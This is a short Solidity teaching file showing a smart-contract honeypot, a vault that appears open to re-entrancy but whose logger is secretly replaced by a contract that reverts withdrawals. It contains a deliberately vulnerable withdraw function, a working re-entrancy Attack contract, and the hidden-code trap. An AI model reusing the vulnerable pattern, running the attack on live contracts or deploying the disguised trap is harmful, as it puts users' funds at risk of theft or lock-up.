// SPDX-License-Identifier: GPL-3.0
// (exact) Source: 
pragma solidity ^0.7.0;

/*
what happens when we combine Hiding code with an exploit like re-entrancy?

what we do here is pretend to be vulnerable to re-entracny exploit 
and then catch the attacker, by reverting the transaction!

NOTE: This allows for attackers to be found, 
but it can not be used as a normal vault storage ...

Logger Legend: 
0 = deposit
1 = withdraw
*/

// taken from ReEntrancy.sol
// this contract is included in the original file
contract SecureVault{
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) { logger = Logger(_logger); }

    function deposit() public payable { 
        balances[msg.sender] += msg.value; 
        logger.log(msg.sender, msg.value, 0);
    }
    
    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
        
        balances[msg.sender] -= _amount;
        logger.log(msg.sender, _amount, 1);
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// included in the original file to be deployed on the blockchain
contract Logger {
    event Log(address caller, uint amount, uint action);

    function log(address _caller, uint _amount, uint _action) public {
        emit Log(_caller, _amount, _action);
    }
}

// taken from ReEntrancy.sol
// What the attacker uses
contract Attack {
    SecureVault public securevault;

    constructor(address _secureVaultAddress) {
        securevault = SecureVault(_secureVaultAddress);
    }

    fallback() external payable {
        if (address(securevault).balance >= 1 wei) {
            securevault.withdraw(1 wei);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 wei);
        securevault.deposit{value: 1 wei}();
        securevault.withdraw(1 wei);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// hidden code, perhaps in another file
contract HoneyPot {
    event Log(address caller, uint amount, uint action);

    function log(address _caller, uint _amount, uint _action) public{
        if(_action == 1) revert("gotcha!");
        emit Log(_caller, _amount, _action);
    }
}
